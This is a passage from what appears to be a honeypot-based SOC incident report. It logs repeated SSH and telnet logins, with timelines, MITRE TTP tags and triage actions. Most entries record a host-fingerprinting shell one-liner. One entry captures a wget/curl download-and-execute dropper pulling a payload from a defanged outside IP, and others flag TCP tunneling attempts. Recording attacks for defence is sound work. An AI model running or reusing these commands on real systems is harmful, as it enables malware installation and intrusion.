| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 07:49:07` | `cowrie.session.connect` |
| `2026-09-06 07:49:07` | `cowrie.client.version` |
| `2026-09-06 07:49:07` | `cowrie.client.kex` |
| `2026-09-06 07:49:09` | `cowrie.login.success` |
| `2026-09-06 07:49:10` | `cowrie.session.params` |
| `2026-09-06 07:49:10` | `cowrie.command.input` |
| `2026-09-06 07:49:11` | `cowrie.log.closed` |
| `2026-09-06 07:49:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9c6c838f79d4

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-09-06 07:51 |
| **Last Seen** | 2026-09-06 07:51 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 07:51:41` | `cowrie.session.connect` |
| `2026-09-06 07:51:41` | `cowrie.client.version` |
| `2026-09-06 07:51:41` | `cowrie.client.kex` |
| `2026-09-06 07:51:43` | `cowrie.login.success` |
| `2026-09-06 07:51:45` | `cowrie.session.params` |
| `2026-09-06 07:51:45` | `cowrie.command.input` |
| `2026-09-06 07:51:46` | `cowrie.log.closed` |
| `2026-09-06 07:51:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bf70d32c0b0f

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-09-06 07:54 |
| **Last Seen** | 2026-09-06 07:54 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 07:54:49` | `cowrie.session.connect` |
| `2026-09-06 07:54:49` | `cowrie.client.version` |
| `2026-09-06 07:54:49` | `cowrie.client.kex` |
| `2026-09-06 07:54:50` | `cowrie.login.success` |
| `2026-09-06 07:54:51` | `cowrie.session.params` |
| `2026-09-06 07:54:51` | `cowrie.command.input` |
| `2026-09-06 07:54:51` | `cowrie.log.closed` |
| `2026-09-06 07:54:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-51af32bb9360

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-09-06 07:56 |
| **Last Seen** | 2026-09-06 07:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 07:56:26` | `cowrie.session.connect` |
| `2026-09-06 07:56:26` | `cowrie.client.version` |
| `2026-09-06 07:56:26` | `cowrie.client.kex` |
| `2026-09-06 07:56:27` | `cowrie.login.success` |
| `2026-09-06 07:56:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5858522ffc54

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-09-06 07:56 |
| **Last Seen** | 2026-09-06 07:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 07:56:27` | `cowrie.session.connect` |
| `2026-09-06 07:56:27` | `cowrie.client.version` |
| `2026-09-06 07:56:27` | `cowrie.client.kex` |
| `2026-09-06 07:56:28` | `cowrie.login.success` |
| `2026-09-06 07:56:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e062cf69bc79

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-09-06 07:57 |
| **Last Seen** | 2026-09-06 07:58 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 07:57:54` | `cowrie.session.connect` |
| `2026-09-06 07:57:55` | `cowrie.client.version` |
| `2026-09-06 07:57:55` | `cowrie.client.kex` |
| `2026-09-06 07:57:57` | `cowrie.login.success` |
| `2026-09-06 07:57:58` | `cowrie.session.params` |
| `2026-09-06 07:57:58` | `cowrie.command.input` |
| `2026-09-06 07:57:59` | `cowrie.log.closed` |
| `2026-09-06 07:58:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d8be90cd19d9

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-09-06 07:59 |
| **Last Seen** | 2026-09-06 07:59 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 07:59:34` | `cowrie.session.connect` |
| `2026-09-06 07:59:34` | `cowrie.client.version` |
| `2026-09-06 07:59:35` | `cowrie.client.kex` |
| `2026-09-06 07:59:35` | `cowrie.login.success` |
| `2026-09-06 07:59:35` | `cowrie.direct-tcpip.request` |
| `2026-09-06 07:59:35` | `cowrie.direct-tcpip.data` |
| `2026-09-06 07:59:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d20fc51bc809

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-09-06 08:02 |
| **Last Seen** | 2026-09-06 08:02 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 08:02:21` | `cowrie.session.connect` |
| `2026-09-06 08:02:21` | `cowrie.client.version` |
| `2026-09-06 08:02:21` | `cowrie.client.kex` |
| `2026-09-06 08:02:24` | `cowrie.login.success` |
| `2026-09-06 08:02:26` | `cowrie.session.params` |
| `2026-09-06 08:02:26` | `cowrie.command.input` |
| `2026-09-06 08:02:27` | `cowrie.log.closed` |
| `2026-09-06 08:02:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dd7e420495c5

| Field | Detail |
|---|---|
| **Source IP** | `16.5.0[.]236` |
| **First Seen** | 2026-09-06 08:03 |
| **Last Seen** | 2026-09-06 08:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `(cd /tmp; wget hxxp://5.182.210[.]174/ok; curl -O hxxp://5.182.210[.]174/ok; chmod +x ok; sh ok; rm -rf ok; rm -rf ok.1) >/dev/null 2>&1 &, cd /tmp, wget hxxp://5.182.210[.]174/ok, curl -O hxxp://5.182.210[.]174/ok, chmod +x ok` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1222.002 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 08:03:28` | `cowrie.session.connect` |
| `2026-09-06 08:03:28` | `cowrie.telnet.option` |
| `2026-09-06 08:03:28` | `cowrie.login.success` |
| `2026-09-06 08:03:29` | `cowrie.session.params` |
| `2026-09-06 08:03:29` | `cowrie.telnet.option` |
| `2026-09-06 08:03:29` | `cowrie.telnet.option` |
| `2026-09-06 08:03:29` | `cowrie.command.input` |
| `2026-09-06 08:03:29` | `cowrie.command.input` |
| `2026-09-06 08:03:29` | `cowrie.command.input` |
| `2026-09-06 08:03:29` | `cowrie.command.input` |
| `2026-09-06 08:03:29` | `cowrie.command.input` |
| `2026-09-06 08:03:29` | `cowrie.command.input` |
| `2026-09-06 08:03:29` | `cowrie.command.input` |
| `2026-09-06 08:03:29` | `cowrie.command.input` |
| `2026-09-06 08:03:29` | `cowrie.command.failed` |
| `2026-09-06 08:03:29` | `cowrie.command.input` |
| `2026-09-06 08:03:29` | `cowrie.command.input` |
| `2026-09-06 08:03:29` | `cowrie.command.input` |
| `2026-09-06 08:03:29` | `cowrie.command.input` |
| `2026-09-06 08:03:29` | `cowrie.command.input` |
| `2026-09-06 08:03:29` | `cowrie.command.input` |
| `2026-09-06 08:03:29` | `cowrie.command.success` |
| `2026-09-06 08:03:29` | `cowrie.command.input` |
| `2026-09-06 08:03:29` | `cowrie.command.input` |
| `2026-09-06 08:03:29` | `cowrie.command.failed` |
| `2026-09-06 08:03:29` | `cowrie.command.input` |
| `2026-09-06 08:03:29` | `cowrie.command.input` |
| `2026-09-06 08:03:29` | `cowrie.command.success` |
| `2026-09-06 08:03:29` | `cowrie.command.input` |
| `2026-09-06 08:03:29` | `cowrie.command.input` |
| `2026-09-06 08:03:29` | `cowrie.command.failed` |
| `2026-09-06 08:03:29` | `cowrie.command.input` |
| `2026-09-06 08:03:29` | `cowrie.command.input` |
| `2026-09-06 08:03:29` | `cowrie.command.success` |
| `2026-09-06 08:03:29` | `cowrie.command.input` |
| `2026-09-06 08:03:29` | `cowrie.command.failed` |
| `2026-09-06 08:03:29` | `cowrie.command.input` |
| `2026-09-06 08:03:29` | `cowrie.log.closed` |
| `2026-09-06 08:03:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `16.5.0[.]236` to AbuseIPDB if not already reported
- [ ] Block `16.5.0[.]236` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3026f85f76ba

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-09-06 08:04 |
| **Last Seen** | 2026-09-06 08:04 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 08:04:25` | `cowrie.session.connect` |
| `2026-09-06 08:04:26` | `cowrie.client.version` |
| `2026-09-06 08:04:26` | `cowrie.client.kex` |
| `2026-09-06 08:04:29` | `cowrie.login.success` |
| `2026-09-06 08:04:30` | `cowrie.session.params` |
| `2026-09-06 08:04:30` | `cowrie.command.input` |
| `2026-09-06 08:04:31` | `cowrie.log.closed` |
| `2026-09-06 08:04:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6d6a500ebaff

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-09-06 08:06 |
| **Last Seen** | 2026-09-06 08:06 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 08:06:46` | `cowrie.session.connect` |
| `2026-09-06 08:06:47` | `cowrie.client.version` |
| `2026-09-06 08:06:47` | `cowrie.client.kex` |
| `2026-09-06 08:06:49` | `cowrie.login.success` |
| `2026-09-06 08:06:50` | `cowrie.session.params` |
| `2026-09-06 08:06:50` | `cowrie.command.input` |
| `2026-09-06 08:06:52` | `cowrie.log.closed` |
| `2026-09-06 08:06:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-51c6d1914ac0

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-09-06 08:09 |
| **Last Seen** | 2026-09-06 08:09 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 08:09:09` | `cowrie.session.connect` |
| `2026-09-06 08:09:10` | `cowrie.client.version` |
| `2026-09-06 08:09:10` | `cowrie.client.kex` |
| `2026-09-06 08:09:12` | `cowrie.login.success` |
| `2026-09-06 08:09:13` | `cowrie.session.params` |
| `2026-09-06 08:09:13` | `cowrie.command.input` |
| `2026-09-06 08:09:13` | `cowrie.log.closed` |
| `2026-09-06 08:09:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bc4ff74281fb

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-09-06 08:11 |
| **Last Seen** | 2026-09-06 08:11 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 08:11:48` | `cowrie.session.connect` |
| `2026-09-06 08:11:49` | `cowrie.client.version` |
| `2026-09-06 08:11:49` | `cowrie.client.kex` |
| `2026-09-06 08:11:50` | `cowrie.login.success` |
| `2026-09-06 08:11:52` | `cowrie.session.params` |
| `2026-09-06 08:11:52` | `cowrie.command.input` |
| `2026-09-06 08:11:52` | `cowrie.log.closed` |
| `2026-09-06 08:11:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d372693c8d38

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-09-06 08:14 |
| **Last Seen** | 2026-09-06 08:14 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 08:14:55` | `cowrie.session.connect` |
| `2026-09-06 08:14:55` | `cowrie.client.version` |
| `2026-09-06 08:14:55` | `cowrie.client.kex` |
| `2026-09-06 08:14:56` | `cowrie.login.success` |
| `2026-09-06 08:14:57` | `cowrie.session.params` |
| `2026-09-06 08:14:57` | `cowrie.command.input` |
| `2026-09-06 08:14:57` | `cowrie.log.closed` |
| `2026-09-06 08:14:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6688744eeb4d

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-09-06 08:18 |
| **Last Seen** | 2026-09-06 08:18 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 08:18:00` | `cowrie.session.connect` |
| `2026-09-06 08:18:00` | `cowrie.client.version` |
| `2026-09-06 08:18:00` | `cowrie.client.kex` |
| `2026-09-06 08:18:02` | `cowrie.login.success` |
| `2026-09-06 08:18:03` | `cowrie.session.params` |
| `2026-09-06 08:18:03` | `cowrie.command.input` |
| `2026-09-06 08:18:04` | `cowrie.log.closed` |
| `2026-09-06 08:18:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fed8280f6b4a

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-09-06 08:20 |
| **Last Seen** | 2026-09-06 08:20 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 08:20:28` | `cowrie.session.connect` |
| `2026-09-06 08:20:29` | `cowrie.client.version` |
| `2026-09-06 08:20:29` | `cowrie.client.kex` |
| `2026-09-06 08:20:32` | `cowrie.login.success` |
| `2026-09-06 08:20:34` | `cowrie.session.params` |
| `2026-09-06 08:20:34` | `cowrie.command.input` |
| `2026-09-06 08:20:34` | `cowrie.log.closed` |
| `2026-09-06 08:20:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c679b3d79ffe

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-09-06 08:22 |
| **Last Seen** | 2026-09-06 08:23 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 08:22:55` | `cowrie.session.connect` |
| `2026-09-06 08:22:56` | `cowrie.client.version` |
| `2026-09-06 08:22:56` | `cowrie.client.kex` |
| `2026-09-06 08:23:00` | `cowrie.login.success` |
| `2026-09-06 08:23:02` | `cowrie.session.params` |
| `2026-09-06 08:23:02` | `cowrie.command.input` |
| `2026-09-06 08:23:03` | `cowrie.log.closed` |
| `2026-09-06 08:23:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cef42ec98fcd

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-09-06 08:25 |
| **Last Seen** | 2026-09-06 08:25 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 08:25:16` | `cowrie.session.connect` |
| `2026-09-06 08:25:16` | `cowrie.client.version` |
| `2026-09-06 08:25:16` | `cowrie.client.kex` |
| `2026-09-06 08:25:17` | `cowrie.login.success` |
| `2026-09-06 08:25:17` | `cowrie.direct-tcpip.request` |
| `2026-09-06 08:25:17` | `cowrie.direct-tcpip.data` |
| `2026-09-06 08:25:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7fdb9fb535dd

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-09-06 08:25 |
| **Last Seen** | 2026-09-06 08:25 |
